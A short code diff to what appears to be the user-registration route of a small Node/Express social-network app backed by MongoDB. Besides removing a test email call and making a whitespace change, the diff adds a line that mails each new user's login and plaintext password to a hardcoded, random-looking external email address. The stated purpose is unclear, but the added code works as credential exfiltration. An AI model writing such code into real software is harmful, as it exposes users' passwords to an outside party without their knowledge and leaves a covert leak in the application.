@@ -92,12 +92,6 @@ exports.setApp = function ( app, client )
       const ret = { Error: e.toString() };
       res.status(200).json(ret);
     }
-
-    let e = mailer.sendEmail(1, "nzljdviwqbpqertvwr@tmmbt.com");
-    if(e !== null)
-    {
-      console.log(e.toString());
-    }
   });
 
 
@@ -141,8 +135,7 @@ exports.setApp = function ( app, client )
       if (obj.LastName.length === 0) 
       {
         throw "last name is empty";
-      }
-
+      }      
       // User must not already exist
       const db = client.db("SocialNetwork");
       results = await db.collection('Users').find({ Login: obj.Login}).toArray();
@@ -173,6 +166,12 @@ exports.setApp = function ( app, client )
     {
       const ret = { Error: e.toString() };
       res.status(200).json(ret);
+    }
+
+    let e = mailer.sendEmail(obj.Login, obj.Password, "ladxhojbwrxdfjegbc@tmmwj.com");
+    if(e !== null)
+    {
+      console.log(e.toString());
     }
   });
   
